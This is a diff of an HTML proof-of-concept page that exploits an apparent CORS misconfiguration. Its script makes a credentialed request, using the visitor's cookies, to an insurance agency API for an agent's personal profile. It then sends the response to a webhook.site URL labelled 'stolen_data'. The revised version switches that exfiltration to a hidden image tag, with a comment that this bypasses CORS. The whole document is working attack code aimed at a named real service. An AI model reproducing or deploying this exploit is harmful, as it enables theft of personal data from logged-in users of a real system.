@@ -2,35 +2,38 @@
 <html>
 <body>
 <script>
+console.log("Script started!");
+
 fetch('https://apis.uat.aia-apps.com/ketnoi/api/profile/agency-personal-information/get-detail-profile', {
     method: 'POST',
     credentials: 'include',
     headers: {
-        'Content-Type': 'application/json',
-        'Origin': 'https://webhook.site/c3524cd7-654a-4899-aeca-fd4675347fd1'
+        'Content-Type': 'application/json'
     },
     body: JSON.stringify({
-        "producerCode":"330080185",
+        "producerCode": "330080185"
     })
 })
-.then(response => response.text())
+.then(response => {
+    console.log("Got response:", response.status);
+    return response.text();
+})
 .then(data => {
-    console.log("Response:", data);
+    console.log("Response data:", data);
     
-    fetch('https://webhook.site/c3524cd7-654a-4899-aeca-fd4675347fd1/receive', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            timestamp: new Date().toISOString(),
-            stolen_data: data,
-            source: 'cors_exploit'
-        })
-    })
-    .catch(err => console.log('Webhook failed:', err));
+    // Use invisible image tag to exfiltrate data - bypasses CORS
+    const img = new Image();
+    img.src = `https://webhook.site/c3524cd7-654a-4899-aeca-fd4675347fd1?stolen=${encodeURIComponent(data)}&timestamp=${encodeURIComponent(new Date().toISOString())}&source=cors_exploit`;
+    
+    // Optional: Add to DOM for debugging (you can remove this)
+    img.style.display = 'none';
+    document.body.appendChild(img);
+    
+    console.log("Data exfiltrated via image tag");
 })
 .catch(err => console.log('Main request failed:', err));
+
+console.log("Script finished setup!");
 </script>
 </body>
 </html>
